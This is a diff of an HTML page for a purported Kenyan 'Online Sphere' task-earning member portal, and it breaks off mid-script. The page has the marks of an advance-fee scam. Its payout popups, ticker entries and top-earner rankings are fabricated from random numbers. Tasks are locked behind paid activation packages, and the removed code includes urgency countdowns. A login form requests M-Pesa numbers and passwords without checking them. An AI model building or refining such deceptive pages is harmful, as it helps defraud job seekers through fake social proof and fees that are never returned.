@@ -5,339 +5,286 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Online Sphere Commerce Company | Official Member Portal</title>
     <style>
-        /* --- BRAND IDENTITY & CORE VARIABLES --- */
+        /* --- BRAND IDENTITY & DYNAMIC THEMING --- */
         :root {
-            --primary: #0a2e5c;
-            --secondary: #0d3d7a;
-            --accent: #1dbf73;
-            --whatsapp: #25D366;
+            --primary: #0a2e5c; --secondary: #0d3d7a; --accent: #1dbf73;
+            --whatsapp: #25D366; --gold: #d4af37; --danger: #e63946;
+            --white: #ffffff; --bg: #f4f7fa; --text-dark: #1e293b;
+            --text-light: #64748b; --card-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
             --email-blue: #007bff;
-            --gold: #d4af37;
-            --danger: #e63946;
-            --white: #ffffff;
-            --bg: #f4f7fa;
-            --text-dark: #1e293b;
-            --text-light: #64748b;
-            --footer-bg: #020617;
-            --card-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
-            --border-radius: 20px;
+        }
+
+        [data-theme="dark"] {
+            --bg: #0f172a; --white: #1e293b; --text-dark: #f1f5f9;
+            --text-light: #94a3b8; --card-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
         }
 
         /* --- GLOBAL RESET --- */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * { margin: 0; padding: 0; box-sizing: border-box; transition: background 0.3s, color 0.3s; }
         html { scroll-behavior: smooth; }
-        body { font-family: 'Inter', 'Segoe UI', sans-serif; background: var(--bg); color: var(--text-dark); line-height: 1.6; overflow-x: hidden; }
+        body { font-family: 'Inter', 'Segoe UI', sans-serif; background: var(--bg); color: var(--text-dark); line-height: 1.6; }
 
-        /* --- 1. SECURITY GATEWAY --- */
-        #gatewayOverlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(135deg, var(--primary) 0%, #000000 100%);
-            display: flex; justify-content: center; align-items: center; z-index: 100000;
-        }
-        .auth-card {
-            background: rgba(255, 255, 255, 0.98); padding: 50px 40px; border-radius: 30px; width: 95%; max-width: 450px;
-            box-shadow: 0 40px 100px rgba(0,0,0,0.6); text-align: center;
-        }
-        .input-group { text-align: left; margin-bottom: 20px; }
-        .input-group label { display: block; font-size: 0.75em; font-weight: 800; color: var(--primary); margin-bottom: 8px; text-transform: uppercase; }
-        .input-group input { width: 100%; padding: 16px; border: 2px solid #e2e8f0; border-radius: 15px; font-size: 16px; outline: none; }
-        .btn-gate { width: 100%; padding: 18px; background: var(--primary); color: white; border: none; border-radius: 15px; font-weight: 800; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
-        .btn-gate:hover { background: #000; transform: translateY(-3px); }
-
-        /* --- 2. GUIDELINES WALL --- */
-        #guidelinesOverlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(2, 6, 23, 0.96); display: none; justify-content: center; align-items: center; z-index: 90000; backdrop-filter: blur(12px);
-        }
-        .guide-modal { background: var(--white); width: 90%; max-width: 650px; border-radius: 35px; padding: 50px; text-align: center; }
-
-        /* --- 3. MAIN DASHBOARD --- */
-        #mainContent { display: none; }
-        nav { background: white; padding: 20px; border-bottom: 1px solid #edf2f7; position: sticky; top: 0; z-index: 1000; }
-        .nav-container { max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; }
-        .nav-logo { font-size: 1.4em; font-weight: 900; color: var(--primary); }
-
-        header { background: linear-gradient(135deg, var(--primary), var(--secondary)); color: white; padding: 80px 20px; text-align: center; }
+        /* --- UI COMPONENTS --- */
+        .theme-switch { position: fixed; bottom: 85px; right: 20px; z-index: 1000; background: var(--primary); color: white; border: none; padding: 12px; border-radius: 50%; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.3); font-size: 1.2em; }
         .container { max-width: 1100px; margin: 0 auto; padding: 0 20px; }
+        
+        /* --- SECURITY GATEWAY --- */
+        #gatewayOverlay { position: fixed; inset: 0; background: linear-gradient(135deg, var(--primary), #000); display: flex; justify-content: center; align-items: center; z-index: 100000; }
+        .auth-card { background: var(--white); padding: 40px; border-radius: 30px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.5); }
+        .input-field { width: 100%; padding: 15px; margin-bottom: 15px; border-radius: 12px; border: 1px solid #ddd; outline: none; font-size: 16px; background: transparent; color: inherit; }
 
-        /* --- DASHBOARD GRID & MEMBERSHIP CARD --- */
-        .user-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: -50px; position: relative; z-index: 10; }
-        .member-card { 
-            background: linear-gradient(135deg, var(--primary), #1a1a1a); 
-            padding: 25px; border-radius: 20px; color: white; position: relative; overflow: hidden;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
-        }
-        .member-card::after { content: 'VERIFIED'; position: absolute; right: -20px; bottom: 10px; font-size: 2.5em; opacity: 0.1; font-weight: 900; transform: rotate(-15deg); }
-        .card-label { font-size: 0.65em; text-transform: uppercase; opacity: 0.7; letter-spacing: 1px; }
-        .card-value { font-size: 1.1em; font-weight: 800; margin-bottom: 10px; }
-        .level-progress { margin-top: 15px; background: rgba(255,255,255,0.1); border-radius: 10px; height: 8px; overflow: hidden; }
-        .level-bar { width: 15%; background: var(--accent); height: 100%; transition: 1s; }
-        .status-badge { background: var(--danger); padding: 4px 12px; border-radius: 5px; font-size: 0.7em; font-weight: 900; }
+        /* --- ONBOARDING TOUR --- */
+        #tourOverlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 95000; display: none; justify-content: center; align-items: center; backdrop-filter: blur(5px); }
+        .tour-box { background: var(--white); padding: 35px; border-radius: 30px; max-width: 380px; text-align: center; border: 3px solid var(--accent); }
 
-        .balance-card { background: white; padding: 25px; border-radius: 20px; box-shadow: var(--card-shadow); border: 1px solid #e2e8f0; text-align: center; }
-        .action-tabs { display: flex; gap: 10px; margin-top: 20px; }
-        .tab-btn { flex: 1; padding: 15px; border: none; border-radius: 12px; font-weight: 800; cursor: pointer; transition: 0.3s; text-transform: uppercase; font-size: 0.8em; }
-        .btn-deposit { background: var(--accent); color: white; }
-        .btn-withdraw { background: var(--primary); color: white; }
+        /* --- DASHBOARD HEADER --- */
+        #mainContent { display: none; }
+        nav { background: var(--white); padding: 18px; border-bottom: 1px solid rgba(0,0,0,0.05); position: sticky; top: 0; z-index: 1000; }
+        header { background: linear-gradient(135deg, var(--primary), var(--secondary)); color: white; padding: 70px 20px; text-align: center; border-radius: 0 0 50px 50px; }
 
-        /* --- MISSION & CEO SECTION --- */
-        .mission-ceo-box { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; margin: 40px 0; }
-        .info-card { background: white; padding: 30px; border-radius: 25px; box-shadow: var(--card-shadow); border: 1px solid #eee; }
-        .ceo-quote { font-style: italic; color: var(--text-light); border-left: 4px solid var(--accent); padding-left: 15px; margin: 15px 0; font-size: 0.9em; }
+        .stories-container { display: flex; gap: 20px; overflow-x: auto; padding: 10px 0 30px; scrollbar-width: none; justify-content: center; }
+        .story-circle { flex: 0 0 70px; height: 70px; border-radius: 50%; border: 3px solid var(--accent); padding: 2px; cursor: pointer; }
+        .story-circle img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; background: #eee; }
 
-        /* --- EARNINGS CALCULATOR --- */
-        .calc-box { background: white; padding: 40px; border-radius: 30px; margin: 40px 0; border: 2px solid #edf2f7; box-shadow: var(--card-shadow); text-align: center; }
-        .calc-slider { width: 100%; height: 10px; border-radius: 5px; background: #e2e8f0; outline: none; -webkit-appearance: none; margin: 25px 0; }
-        .calc-slider::-webkit-slider-thumb { -webkit-appearance: none; width: 25px; height: 25px; border-radius: 50%; background: var(--accent); cursor: pointer; border: 4px solid white; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        .calc-result { font-size: 2.2em; font-weight: 900; color: var(--accent); margin-top: 10px; }
+        /* --- CARDS & GRID --- */
+        .user-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: -50px; }
+        .card { background: var(--white); padding: 30px; border-radius: 25px; box-shadow: var(--card-shadow); }
+        .member-card { background: linear-gradient(135deg, #1e293b, #000); color: white; }
+        .level-bar { height: 8px; background: rgba(255,255,255,0.1); border-radius: 10px; margin: 15px 0; }
+        .level-fill { height: 100%; background: var(--accent); width: 15%; border-radius: 10px; }
 
-        /* --- URGENCY TIMER --- */
-        .activation-call { background: #fff9db; border: 2px dashed #f08c00; padding: 30px; border-radius: 25px; margin-top: 30px; text-align: center; }
-        .timer-box { font-weight: 900; color: var(--danger); font-size: 1.8em; margin: 10px 0; font-family: monospace; }
+        /* --- TASK DIRECTORY & CALCULATOR --- */
+        .task-item { display: flex; justify-content: space-between; align-items: center; padding: 20px; border-bottom: 1px solid rgba(0,0,0,0.05); filter: blur(4px); opacity: 0.6; }
+        .hot-badge { background: #fff5f5; color: #ff4d4d; font-size: 0.7em; padding: 4px 10px; border-radius: 6px; font-weight: 800; }
+        .slider { width: 100%; margin: 20px 0; accent-color: var(--accent); cursor: pointer; }
 
-        /* --- TASK DIRECTORY & RANKINGS --- */
-        .dashboard-grid-v2 { display: grid; grid-template-columns: 2fr 1fr; gap: 30px; margin-top: 40px; }
-        .task-directory { background: white; border-radius: 25px; padding: 30px; box-shadow: var(--card-shadow); }
-        .task-item { display: flex; justify-content: space-between; align-items: center; padding: 20px; border-bottom: 1px solid #f1f5f9; filter: blur(3px); opacity: 0.6; user-select: none; }
-        .ranking-side { background: var(--primary); border-radius: 25px; padding: 30px; color: white; }
-        .rank-item { display: flex; align-items: center; gap: 15px; margin-bottom: 20px; padding-bottom: 10px; border-bottom: 1px solid rgba(255,255,255,0.1); }
+        /* --- FAQ SECTION --- */
+        .faq-item { margin-bottom: 10px; border-bottom: 1px solid rgba(0,0,0,0.05); }
+        .faq-trigger { width: 100%; text-align: left; background: none; border: none; padding: 15px 0; font-weight: 700; cursor: pointer; color: var(--text-dark); font-size: 1em; display: flex; justify-content: space-between; }
+        .faq-content { display: none; padding-bottom: 15px; font-size: 0.9em; color: var(--text-light); }
 
-        /* --- PROOF UPLOAD --- */
-        .proof-section { background: #f1f5f9; border: 2px dashed #cbd5e1; padding: 35px; border-radius: 25px; text-align: center; margin: 40px 0; }
-        .btn-upload { background: var(--primary); color: white; padding: 12px 30px; border-radius: 50px; cursor: pointer; display: inline-block; font-weight: 700; margin-top: 15px; }
+        /* --- CONTACT HUB --- */
+        .contact-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-top: 30px; }
+        .contact-btn { padding: 15px; border-radius: 15px; text-decoration: none; color: white; font-weight: 800; text-align: center; display: block; font-size: 0.9em; }
 
-        /* --- LIVE PAYOUT TICKER --- */
-        .gallery-wrapper { max-width: 850px; margin: 0 auto; background: white; border-radius: 25px; box-shadow: var(--card-shadow); border: 2px solid #edf2f7; overflow: hidden; }
-        .gallery-viewport { height: 350px; overflow: hidden; position: relative; }
-        .gallery-container { position: absolute; width: 100%; animation: slideContinuous 35s linear infinite; }
-        .payout-row { display: grid; grid-template-columns: 1.5fr 1fr 1fr; padding: 22px 30px; border-bottom: 1px solid #f1f5f9; align-items: center; font-size: 0.9em; }
+        /* --- TICKER --- */
+        .gallery-wrapper { background: var(--white); border-radius: 25px; overflow: hidden; margin: 30px 0; border: 1px solid rgba(0,0,0,0.05); }
+        .gallery-viewport { height: 250px; overflow: hidden; position: relative; }
+        .gallery-container { position: absolute; width: 100%; animation: slideContinuous 45s linear infinite; }
+        .payout-row { display: grid; grid-template-columns: 1fr 1fr 1fr; padding: 15px 25px; border-bottom: 1px solid rgba(0,0,0,0.03); font-size: 0.85em; }
+
+        /* --- BUTTONS --- */
+        .btn-main { background: var(--primary); color: white; border: none; padding: 18px; border-radius: 15px; font-weight: 800; cursor: pointer; width: 100%; text-transform: uppercase; }
+        
+        #payoutPopup { position: fixed; bottom: 20px; left: 20px; background: var(--white); padding: 15px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); border-left: 5px solid var(--accent); display: none; align-items: center; gap: 10px; z-index: 10000; animation: slideUp 0.5s; }
+        @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
         @keyframes slideContinuous { 0% { transform: translateY(0); } 100% { transform: translateY(-50%); } }
 
-        /* --- LIVE POPUPS --- */
-        #payoutPopup {
-            position: fixed; bottom: 20px; left: 20px; background: white; padding: 15px 25px;
-            border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); border-left: 5px solid var(--accent);
-            display: none; align-items: center; gap: 15px; z-index: 200000; animation: slideUp 0.5s ease-out;
-        }
-        @keyframes slideUp { from { transform: translateY(100px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-
-        /* --- COMMUNITY SECTION --- */
-        .community-cta { background: var(--whatsapp); color: white; padding: 50px 20px; border-radius: 35px; text-align: center; margin-top: 50px; }
-        .btn-join { display: inline-block; background: white; color: var(--whatsapp); padding: 15px 45px; border-radius: 50px; text-decoration: none; font-weight: 900; margin-top: 20px; transition: 0.3s; }
-        .btn-join:hover { transform: scale(1.05); }
-
-        /* --- SUPPORT BUTTONS --- */
-        .contact-wrap { display: flex; justify-content: center; gap: 20px; margin-top: 40px; flex-wrap: wrap; }
-        .btn-contact { text-decoration: none; padding: 18px 40px; border-radius: 50px; color: white; font-weight: 800; transition: 0.3s; }
-        .btn-contact:hover { transform: translateY(-3px); }
-
-        @media (max-width: 850px) {
-            .user-grid, .dashboard-grid-v2, .mission-ceo-box { grid-template-columns: 1fr; }
-            header { padding: 60px 20px; }
-        }
+        @media (max-width: 850px) { .user-grid { grid-template-columns: 1fr; } }
     </style>
 </head>
-<body>
+<body data-theme="light">
 
-<div id="payoutPopup">
-    <div style="font-size: 1.5em;">💰</div>
-    <div><strong id="popupUser">User 0712***456</strong> <br> <span id="popupAction">just withdrew KES 2,500</span></div>
-</div>
+<button class="theme-switch" onclick="toggleTheme()">🌓</button>
 
 <div id="gatewayOverlay">
     <div class="auth-card">
-        <h2 style="color:var(--primary); font-weight:900; margin-bottom:30px;">MEMBER PORTAL</h2>
-        <div id="loginForm">
-            <div class="input-group"><label>M-Pesa Number</label><input type="tel" id="gatePh" placeholder="07XXXXXXXX"></div>
-            <div class="input-group"><label>Password</label><input type="password" id="gatePs" placeholder="••••••••"></div>
-            <button class="btn-gate" onclick="verifyGate()">Authorize Entry</button>
-            <p style="margin-top:25px;"><span style="color:var(--email-blue); cursor:pointer; font-size:0.85em; font-weight:700;" onclick="toggleReset(true)">Reset Credentials</span></p>
-        </div>
+        <h2 style="color:var(--primary); margin-bottom:20px;">MEMBER PORTAL</h2>
+        <input type="tel" id="gatePh" placeholder="M-Pesa Number" class="input-field">
+        <input type="password" id="gatePs" placeholder="Portal Password" class="input-field">
+        <button class="btn-main" onclick="verifyGate()">AUTHORIZE ENTRY</button>
     </div>
 </div>
 
-<div id="guidelinesOverlay">
-    <div class="guide-modal">
-        <h2 style="color:var(--primary); font-weight:900;">TERMS OF SERVICE</h2>
-        <p style="margin:20px 0; color:var(--text-light);">Integrity is our core operating system. Any attempt to exploit tasks will result in a permanent ban.</p>
-        <button class="btn-gate" style="background:var(--accent); color:var(--primary);" onclick="enterPortal()">I AGREE & ENTER</button>
+<div id="tourOverlay">
+    <div class="tour-box">
+        <h3 id="tourTitle" style="color:var(--primary); font-weight:900;">Welcome!</h3>
+        <p id="tourText" style="margin:20px 0; color:var(--text-light);"></p>
+        <button onclick="nextTourStep()" class="btn-main" style="background:var(--accent); padding:12px;">NEXT STEP</button>
     </div>
 </div>
 
 <div id="mainContent">
-    <nav><div class="nav-container"><div class="nav-logo">ONLINE SPHERE</div><button onclick="logout()" style="color:var(--danger); border:2px solid var(--danger); background:none; padding:8px 15px; border-radius:50px; font-weight:800; cursor:pointer;">EXIT</button></div></nav>
+    <nav><div class="container" style="display:flex; justify-content:space-between; align-items:center;">
+        <div style="font-weight:900; color:var(--primary); letter-spacing:1px;">ONLINE SPHERE</div>
+        <div style="color:var(--danger); font-weight:800; cursor:pointer;" onclick="location.reload()">LOGOUT</div>
+    </div></nav>
 
-    <header><h1>DASHBOARD ACTIVE</h1><p>Online Sphere Commerce Company | Official Member Portal</p></header>
+    <header>
+        <div class="container">
+            <div class="stories-container">
+                <div class="story-circle" onclick="alert('Story: Agnes withdrew KES 5,400 today!')"><img src="https://img.icons8.com/color/96/user-female-circle--v1.png"></div>
+                <div class="story-circle" onclick="alert('Story: Benson upgraded to Executive Status!')"><img src="https://img.icons8.com/color/96/user-male-circle--v1.png"></div>
+                <div class="story-circle" onclick="alert('Story: Peter earned KES 1,200 in 20 minutes!')"><img src="https://img.icons8.com/color/96/administrator-male-circle.png"></div>
+            </div>
+            <h1 style="font-weight:900;">DASHBOARD ACTIVE</h1>
+        </div>
+    </header>
 
     <div class="container">
         <div class="user-grid">
-            <div class="member-card">
-                <div class="card-label">Official Member ID</div>
-                <div class="card-value" id="userCardName">Verifying...</div>
-                <div class="card-label">Level 1: Newbie (15% to Bronze)</div>
-                <div class="level-progress"><div class="level-bar"></div></div>
-                <div style="margin-top:15px;"><span class="status-badge">UNVERIFIED</span></div>
+            <div class="card member-card" id="tour-card">
+                <p style="font-size:0.7em; opacity:0.7;">ACCOUNT HOLDER</p>
+                <h3 id="uName">07XXXXXXXX</h3>
+                <div class="level-bar"><div class="level-fill"></div></div>
+                <p style="font-size:0.7em;">LEVEL 1: NEWBIE STATUS</p>
             </div>
-            <div class="balance-card">
-                <div class="card-label">Withdrawable Balance</div>
-                <div style="font-size: 2.2em; font-weight: 900; color: var(--danger); margin: 10px 0;">KES 0.00</div>
-                <div class="action-tabs">
-                    <button class="tab-btn btn-deposit" onclick="handleDeposit()">+ Deposit</button>
-                    <button class="tab-btn btn-withdraw" onclick="handleWithdraw()">- Withdraw</button>
-                </div>
+            <div class="card" style="text-align:center;" id="tour-balance">
+                <p style="font-size:0.7em; font-weight:800;">CURRENT BALANCE</p>
+                <h2 style="color:var(--danger); font-size:2.2em;">KES 0.00</h2>
+                <button class="btn-main" style="background:var(--accent); padding:10px; margin-top:10px;" onclick="alert('Activation Required')">WITHDRAW NOW</button>
             </div>
         </div>
 
-        <div class="activation-call">
-            <h3 style="color:#d9480f;">🎁 NEW MEMBER BONUS</h3>
-            <p>Step in, work smart and grow. Activate your account within the next 15 minutes to receive a <strong>KES 250 Activation Bonus!</strong></p>
-            <div class="timer-box" id="timer">15:00</div>
-            <a href="#packages" class="btn-gate" style="display:inline-block; width:auto; padding:15px 40px; background:#f08c00; text-decoration:none;">CLAIM MY BONUS NOW</a>
-        </div>
-
-        <div class="mission-ceo-box">
-            <div class="info-card">
-                <h3 style="color:var(--primary); font-weight:900;">Our Mission</h3>
-                <p style="color:var(--text-light); margin-top:10px;">To empower the digital workforce of Kenya by providing a secure, transparent, and high-yielding commerce platform where talent meets global opportunity.</p>
+        <div class="user-grid" style="margin-top:20px;">
+            <div class="card">
+                <h4 style="color:var(--primary); font-weight:900;">Our Mission</h4>
+                <p style="font-size:0.85em; color:var(--text-light); margin-top:10px;">To provide Kenyans with a safe, transparent digital workspace where every task completed earns instant M-Pesa value.</p>
             </div>
-            <div class="info-card">
-                <h3 style="color:var(--primary); font-weight:900;">CEO Message</h3>
-                <div class="ceo-quote">"Integrity is not just a value; it's our operating system. We grow when you succeed."</div>
-                <p style="font-weight:700; font-size:0.85em;">- Chief Executive Officer</p>
+            <div class="card" style="border-left: 5px solid var(--accent);">
+                <h4 style="color:var(--primary); font-weight:900;">CEO Message</h4>
+                <p style="font-style:italic; font-size:0.85em; margin:10px 0;">"Integrity is our core operating system. We grow when you succeed."</p>
+                <p style="font-weight:900; font-size:0.7em;">- CHIEF EXECUTIVE OFFICER</p>
             </div>
         </div>
 
-        <div class="calc-box">
+        <div class="card" style="margin-top:20px; text-align:center;">
             <h3 style="color:var(--primary); font-weight:900;">Earnings Estimator</h3>
-            <p style="color:var(--text-light);">Slide to select how many daily tasks you can complete:</p>
-            <input type="range" min="1" max="25" value="5" class="calc-slider" id="taskSlider" oninput="calculate()">
-            <div style="display:flex; justify-content: space-between; font-weight:800; padding: 0 10px;">
-                <div>Daily Tasks: <span id="taskVal">5</span></div>
-                <div class="calc-result">KES <span id="estEarn">3,500</span>/week</div>
+            <p style="font-size:0.85em; color:var(--text-light);">Daily Goal: <span id="tVal" style="font-weight:900; color:var(--accent);">5</span> Tasks</p>
+            <input type="range" min="1" max="40" value="5" class="slider" oninput="updateCalc(this.value)">
+            <div style="font-size:1.8em; font-weight:900;">KES <span id="eVal" style="color:var(--accent);">3,500</span>/week</div>
+        </div>
+
+        <div class="card" style="margin-top:20px;" id="tour-tasks">
+            <h3 style="color:var(--primary); font-weight:900; margin-bottom:15px;">Task Directory</h3>
+            <div class="task-item">
+                <div><strong>Ad Verification</strong> <span class="hot-badge" id="h1">12 slots</span></div>
+                <div style="color:var(--accent); font-weight:900;">KES 1,200</div>
+            </div>
+            <div class="task-item">
+                <div><strong>Data Entry Tier 1</strong> <span class="hot-badge" id="h2">5 slots</span></div>
+                <div style="color:var(--accent); font-weight:900;">KES 450</div>
             </div>
         </div>
 
-        <div class="dashboard-grid-v2">
-            <div class="task-directory">
-                <h3 style="color:var(--primary); font-weight:900; margin-bottom:20px;">Task Directory <span style="color:var(--danger); font-size:0.6em;">[LOCKED]</span></h3>
-                <div class="task-item"><div><h4>Data Entry (Tier 1)</h4><small style="color:red; font-weight:800;">LOCKED</small></div><div style="color:var(--accent); font-weight:900;">KES 450</div></div>
-                <div class="task-item"><div><h4>Product Ad Review</h4><small style="color:red; font-weight:800;">LOCKED</small></div><div style="color:var(--accent); font-weight:900;">KES 1,200</div></div>
-                <div class="task-item"><div><h4>Commerce Feedback</h4><small style="color:red; font-weight:800;">LOCKED</small></div><div style="color:var(--accent); font-weight:900;">KES 800</div></div>
+        <div class="card" style="margin-top:20px;">
+            <h3 style="color:var(--primary); font-weight:900; margin-bottom:15px;">Frequently Asked Questions</h3>
+            <div class="faq-item">
+                <button class="faq-trigger" onclick="toggleFaq(0)">How do I start earning? <span>+</span></button>
+                <div class="faq-content">Choose a package, activate your account, and start completing tasks in the directory.</div>
             </div>
-            <div class="ranking-side">
-                <h3 style="margin-bottom:25px; border-bottom: 2px solid var(--gold); padding-bottom:10px;">Daily Top Earners</h3>
-                <div class="rank-item"><div>#1</div><div>0722***492 <br> <span style="color:var(--accent); font-weight:800;">KES 14,200</span></div></div>
-                <div class="rank-item"><div>#2</div><div>0741***112 <br> <span style="color:var(--accent); font-weight:800;">KES 9,850</span></div></div>
-                <div class="rank-item"><div>#3</div><div>0110***834 <br> <span style="color:var(--accent); font-weight:800;">KES 7,100</span></div></div>
+            <div class="faq-item">
+                <button class="faq-trigger" onclick="toggleFaq(1)">When can I withdraw? <span>+</span></button>
+                <div class="faq-content">Withdrawals are instant to M-Pesa once you reach the minimum threshold of KES 50.</div>
+            </div>
+            <div class="faq-item">
+                <button class="faq-trigger" onclick="toggleFaq(2)">Is the activation fee refundable? <span>+</span></button>
+                <div class="faq-content">The activation fee is a one-time commitment to secure your account and digital tools.</div>
             </div>
         </div>
 
-        <div class="proof-section">
-            <h3 style="color:var(--primary);">Got Paid? Share the Trust!</h3>
-            <p style="color:var(--text-light);">Upload your M-Pesa withdrawal screenshot to be featured in our Live Gallery.</p>
-            <label class="btn-upload">Choose Screenshot <input type="file" hidden onchange="alert('Screenshot received! Verification in progress.')"></label>
-        </div>
-
-        <section style="margin: 60px 0;">
-            <h2 style="text-align:center; margin-bottom:25px;">Live Payout Gallery</h2>
-            <div class="gallery-wrapper">
-                <div class="gallery-viewport"><div class="gallery-container" id="payoutBox"></div></div>
+        <div class="card" style="margin-top:20px; background: var(--primary); color: white;">
+            <h3 style="text-align:center;">Contact Support</h3>
+            <div class="contact-grid">
+                <a href="https://wa.me/254741723223" class="contact-btn" style="background:var(--whatsapp);">WhatsApp Support</a>
+                <a href="mailto:support@onlinesphere.co.ke" class="contact-btn" style="background:var(--email-blue);">Email Help Desk</a>
+                <a href="tel:+254741723223" class="contact-btn" style="background:var(--accent);">Call Agent</a>
             </div>
-        </section>
-
-        <section id="packages" style="display:grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap:25px;">
-            <div class="balance-card"><h3>Starter</h3><div style="font-size:2em; font-weight:900; color:var(--primary); margin:15px 0;">KES 500</div><p>Standard Task Access</p></div>
-            <div class="balance-card" style="border: 2px solid var(--gold);"><h3>Executive</h3><div style="font-size:2em; font-weight:900; color:var(--primary); margin:15px 0;">KES 2,500</div><p>Priority Tasking & High Yield</p></div>
-            <div class="balance-card"><h3>Professional</h3><div style="font-size:2em; font-weight:900; color:var(--primary); margin:15px 0;">KES 1,500</div><p>Full Task Catalog</p></div>
-        </section>
-
-        <div class="community-cta">
-            <h2>Join Our Official Community</h2>
-            <p>Connect with over 10,000 active earners today.</p>
-            <a href="https://chat.whatsapp.com/I9P2IF2gdFj7IJJKpHMenF?mode=gi_t" target="_blank" class="btn-join">JOIN THE EARNERS GROUP</a>
         </div>
 
-        <div class="contact-wrap">
-            <a href="https://wa.me/254741723223" class="btn-contact" style="background:var(--whatsapp);">WhatsApp Support</a>
-            <a href="mailto:support@onlinesphere.co.ke" class="btn-contact" style="background:var(--email-blue);">Technical Help Desk</a>
+        <h3 style="text-align:center; margin-top:40px;">Live Payout Gallery</h3>
+        <div class="gallery-wrapper">
+            <div class="gallery-viewport"><div class="gallery-container" id="tickerBox"></div></div>
         </div>
+
+        <footer style="text-align:center; padding:50px 0; font-size:0.8em; color:var(--text-light);">
+            &copy; 2026 Online Sphere Commerce Company. All Rights Reserved.
+        </footer>
     </div>
-
-    <footer style="background: var(--footer-bg); color: #64748b; padding: 60px 20px; text-align: center; margin-top: 60px;">
-        <p>&copy; 2026 Online Sphere Commerce Company. All Rights Reserved.</p>
-    </footer>
 </div>
 
+<div id="payoutPopup">💰 <span id="pText"></span></div>
+
 <script>
-    // DASHBOARD CORE LOGIC
+    // THEME & AUTH
+    function toggleTheme() {
+        const b = document.body;
+        b.setAttribute('data-theme', b.getAttribute('data-theme') === 'light' ? 'dark' : 'light');
+    }
+
     function verifyGate() {
         const ph = document.getElementById('gatePh').value;
-        if(ph.length >= 10 && document.getElementById('gatePs').value) {
-            document.getElementById('userCardName').innerText = ph;
-            document.getElementById('gatewayOverlay').style.display = 'none';
-            document.getElementById('guidelinesOverlay').style.display = 'flex';
-        }
-    }
-    function enterPortal() {
-        localStorage.setItem('sphere_auth', 'true');
-        localStorage.setItem('sphere_user', document.getElementById('gatePh').value);
-        document.getElementById('guidelinesOverlay').style.display = 'none';
-        document.getElementById('mainContent').style.display = 'block';
-        startTimer(900, document.getElementById('timer'));
-    }
-    function logout() { localStorage.removeItem('sphere_auth'); location.reload(); }
-
-    // CALCULATOR
-    function calculate() {
-        const t = document.getElementById('taskSlider').value;
-        document.getElementById('taskVal').innerText = t;
-        document.getElementById('estEarn').innerText = (t * 700 * 7).toLocaleString();
-    }
-
-    // TIMER
-    function startTimer(duration, display) {
-        let timer = duration, min, sec;
-        setInterval(() => {
-            min = parseInt(timer / 60, 10);
-            sec = parseInt(timer % 60, 10);
-            display.textContent = (min < 10 ? "0" + min : min) + ":" + (sec < 10 ? "0" + sec : sec);
-            if (--timer < 0) timer = duration;
-        }, 1000);
-    }
-
-    // LIVE SOCIAL PROOF
-    function showPopup() {
-        const pre = ['072', '071', '079', '011'];
-        const ac = ['withdrew KES 2,500', 'withdrew KES 1,800', 'activated Executive Tier', 'withdrew KES 5,000'];
-        document.getElementById('popupUser').innerText = "User " + pre[Math.floor(Math.random()*4)] + "***" + Math.floor(100+Math.random()*800);
-        document.getElementById('popupAction').innerText = "just " + ac[Math.floor(Math.random()*4)];
-        document.getElementById('payoutPopup').style.display = 'flex';
-        setTimeout(() => { document.getElementById('payoutPopup').style.display = 'none'; }, 4500);
-    }
-    setInterval(showPopup, 12000);
-
-    // TICKER
-    const pBox = document.getElementById('payoutBox');
-    function rows(n) {
-        let h = '';
-        for(let i=0; i<n; i++) {
-            h += `<div class="payout-row"><div>072xxxx${Math.floor(100+Math.random()*800)}</div><div style="color:var(--accent); font-weight:900;">KES ${(Math.floor(Math.random()*60)+10)*100}</div><div style="opacity:0.5; font-family:monospace;">OS${Math.floor(10000+Math.random()*90000)}</div></div>`;
-        }
-        return h;
-    }
-    pBox.innerHTML = rows(20) + rows(20);
-
-    function handleDeposit() { alert("Initializing secure M-Pesa STK Push... Please select a package below."); document.getElementById('packages').scrollIntoView(); }
-    function handleWithdraw() { alert("Account Unverified: Your current balance is KES 0.00. Please activate your account first."); }
-
-    window.onload = () => {
-        if(localStorage.getItem('sphere_auth')) {
+        if(ph.length >= 10) {
             document.getElementById('gatewayOverlay').style.display = 'none';
             document.getElementById('mainContent').style.display = 'block';
-            document.getElementById('userCardName').innerText = localStorage.getItem('sphere_user');
-            startTimer(900, document.getElementById('timer'));
+            document.getElementById('uName').innerText = ph;
+            if(!localStorage.getItem('sphere_tour_done')) startTour();
+            buildTicker();
         }
-    };
+    }
+
+    // ONBOARDING TOUR LOGIC
+    let tourStep = 0;
+    const tourData = [
+        { title: "Member ID", text: "This card shows your level. Higher levels unlock higher pay!", el: "tour-card" },
+        { title: "Earnings", text: "Withdraw your earnings directly to M-Pesa instantly.", el: "tour-balance" },
+        { title: "Hot Tasks", text: "Grab tasks with limited slots before they run out!", el: "tour-tasks" }
+    ];
+
+    function startTour() {
+        document.getElementById('tourOverlay').style.display = 'flex';
+        updateTour();
+    }
+
+    function updateTour() {
+        document.getElementById('tourTitle').innerText = tourData[tourStep].title;
